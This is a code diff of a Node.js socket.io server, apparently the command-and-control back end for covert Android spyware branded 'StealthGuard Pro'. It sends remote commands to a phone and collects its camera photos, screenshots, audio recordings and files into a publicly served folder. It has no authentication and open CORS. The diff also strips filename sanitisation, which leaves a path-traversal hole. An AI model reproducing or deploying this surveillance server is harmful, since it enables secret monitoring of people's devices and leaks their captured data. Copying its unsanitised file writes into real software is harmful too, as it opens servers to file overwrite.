@@ -3,110 +3,71 @@ const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
 const fs = require('fs');
-const path = require('path');
 
 const app = express();
 app.use(cors());
-app.use(express.json());
 app.use(express.static('public'));
+app.get('/ping', (req, res) => res.send('pong'));
 
 const server = http.createServer(app);
 const io = new Server(server, {
-    cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8,
-    pingTimeout: 60000,
-    pingInterval: 25000
+    cors: { origin: "*" },
+    maxHttpBufferSize: 1e8, // 100MB for fast files/mirror
+    pingTimeout: 30000,
+    pingInterval: 10000
 });
 
 let androidSocket = null;
 let webSocket = null;
-
-// Keep-alive route for UptimeRobot
-app.get('/ping', (req, res) => res.send('pong'));
 
 io.on('connection', (socket) => {
     const isWeb = socket.handshake.query.type === 'web';
 
     if (isWeb) {
         webSocket = socket;
-        console.log(`[+] Web Dashboard Connected`);
-        if (androidSocket) {
-            webSocket.emit('device_status', { connected: true });
-            androidSocket.emit('remote_command', { action: 'ping' }); // Wake up check
-        }
+        if (androidSocket) webSocket.emit('device_status', { connected: true, model: androidSocket.model });
 
         socket.on('gui_command', (data) => {
-            if (androidSocket && androidSocket.connected) {
-                console.log(`[CMD] Sending ${data.action} to Android`);
-                androidSocket.emit('remote_command', data);
-            } else {
-                socket.emit('server_log', "Error: Android Device Offline!");
-            }
+            if (androidSocket) androidSocket.emit('remote_command', data);
         });
-
     } else {
-        // Android Connection
-        if (androidSocket) {
-            console.log("[!] Replacing old Android socket with new one");
-            androidSocket.disconnect();
-        }
-
+        if (androidSocket) androidSocket.disconnect();
         androidSocket = socket;
-        console.log(`[+] ANDROID DEVICE CONNECTED: ${socket.id}`);
-        if (webSocket) webSocket.emit('device_status', { connected: true });
+        androidSocket.model = socket.handshake.query.model || "Unknown";
+        if (webSocket) webSocket.emit('device_status', { connected: true, model: androidSocket.model });
 
         socket.onAny((event, data) => {
             if (webSocket) webSocket.emit(event, data);
         });
 
-        socket.on('child_photo_taken', (data) => {
-            try {
-                const buffer = Buffer.from(data.image, 'base64');
-                fs.writeFileSync('public/captured_photo.jpg', buffer);
-                if (webSocket) webSocket.emit('child_photo_taken', { success: true });
-            } catch (e) { console.error("Save error:", e); }
-        });
+        // Specialized File/Image Handlers
+        socket.on('child_photo_taken', (data) => saveFile('captured_photo.jpg', data.image, 'child_photo_taken'));
+        socket.on('child_screenshot', (data) => saveFile('captured_screenshot.jpg', data.image, 'child_screenshot_ready'));
 
-        socket.on('child_screenshot', (data) => {
-            try {
-                const buffer = Buffer.from(data.image, 'base64');
-                fs.writeFileSync('public/captured_screenshot.jpg', buffer);
-                if (webSocket) webSocket.emit('child_screenshot_taken', { success: true });
-            } catch (e) { console.error("Screenshot save error:", e); }
+        socket.on('child_audio_recorded', (data) => {
+            const name = `audio_${Date.now()}.mp3`;
+            saveFile(`downloads/${name}`, data.audio, 'audio_ready', { url: `/downloads/${name}`, name });
         });
 
         socket.on('file_data', (data) => {
-            try {
-                if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
-                const buffer = Buffer.from(data.file_data, 'base64');
-                const safeName = data.file_name.replace(/[^a-z0-9.]/gi, '_');
-                fs.writeFileSync(`public/downloads/${safeName}`, buffer);
-                if (webSocket) webSocket.emit('download_ready', { name: data.file_name });
-            } catch (e) { console.error("Download error:", e); }
+            saveFile(`downloads/${data.file_name}`, data.file_data, 'download_ready', { name: data.file_name });
         });
 
-        socket.on('child_audio_recorded', (data) => {
-            try {
-                if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
-                const buffer = Buffer.from(data.audio, 'base64');
-                const fileName = `recording_${Date.now()}.mp3`;
-                fs.writeFileSync(`public/downloads/${fileName}`, buffer);
-                if (webSocket) webSocket.emit('audio_ready', { url: `/downloads/${fileName}`, name: fileName });
-            } catch (e) { console.error("Audio save error:", e); }
+        socket.on('disconnect', () => {
+            androidSocket = null;
+            if (webSocket) webSocket.emit('device_status', { connected: false });
         });
     }
-
-    socket.on('disconnect', () => {
-        if (socket === webSocket) {
-            console.log("[-] Web Dashboard Disconnected");
-            webSocket = null;
-        }
-    });
 });
+
+function saveFile(filename, base64, emitEvent, extraData = {}) {
+    try {
+        const buffer = Buffer.from(base64, 'base64');
+        if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
+        fs.writeFileSync(`public/${filename}`, buffer);
+        if (webSocket) webSocket.emit(emitEvent, extraData);
+    } catch (e) { console.error("Save Error:", e); }
+}
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\nSTEALTHGUARD PRO SERVER ACTIVE`);
-    console.log(`URL: https://my-stealth-guard.onrender.com`);
-    console.log(`PORT: ${PORT}\n`);
-});
+server.listen(PORT, '0.0.0.0', () => console.log(`ELITE SERVER ACTIVE ON PORT ${PORT}`));
